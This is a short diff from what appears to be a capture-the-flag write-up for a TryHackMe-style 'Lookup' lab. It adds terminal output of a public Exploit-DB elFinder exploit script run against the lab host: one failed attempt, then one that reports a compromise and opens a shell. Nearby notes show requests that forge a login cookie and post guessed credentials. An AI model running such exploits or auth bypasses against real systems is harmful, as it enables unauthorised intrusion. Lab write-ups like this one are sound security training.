@@ -364,6 +364,23 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 
 http --session=auth_session GET http://files.lookup.thm/ Cookie:"login_status=success"
 
+
+       
+┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─# python2 ./46481.py http://files.lookup.thm/elFinder
+[*] Uploading the malicious image...
+[*] Running the payload...
+[*] The site seems not to be vulnerable :(
+                                                                             
+┌──(root㉿vbox)-[/usr/…/exploitdb/exploits/php/webapps]
+└─# python2 ./46481.py http://files.lookup.thm/elFinder/php/connector.minimal.php
+[*] Uploading the malicious image...
+[*] Running the payload...
+[+] Pwned! :)
+[+] Getting the shell...
+$ 
+
+
 # 쿠키 재사용
 
 http --session=lookup_session POST http://lookup.thm/login.php username=jose password=password123
